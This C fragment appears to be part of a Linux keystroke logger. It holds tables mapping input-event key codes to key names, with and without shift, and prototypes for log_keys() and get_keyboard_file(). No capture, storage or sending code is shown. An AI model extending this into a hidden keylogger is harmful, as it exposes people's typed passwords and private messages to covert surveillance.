#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/types.h>

//char *get_key(__u16 key_code);
#define UK "\0"

#define KEY_RELEASE 0
#define KEY_PRESS 1

/*
 * keys are defined in /usr/include/linux/input-event-codes.
 */
static char *key_names[] = {
   UK, "<ESC>",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   "<Backspace>", "<Tab>",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
   "[", "]", "<Enter>", "<LCtrl>",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "<LShift>",
   "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
   "<RShift>",
   "<KP*>",
   "<LAlt>", " ", "<CapsLock>",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   UK, UK, UK,
   "<F11>", "<F12>",
   UK, UK, UK, UK, UK, UK, UK,
   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

static char *shift_key_names[] = {
   UK, "<ESC>",
   "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
   "<Backspace>", "<Tab>",
   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   "{", "}", "<Enter>", "<LCtrl>",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
   "\"", "~", "<LShift>",
   "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
   "<RShift>",
   "<KP*>",
   "<LAlt>", " ", "<CapsLock>",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   UK, UK, UK,
   "<F11>", "<F12>",
   UK, UK, UK, UK, UK, UK, UK,
   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

int log_keys();
char *get_keyboard_file();
void free_kbd(char *keyboard_file);
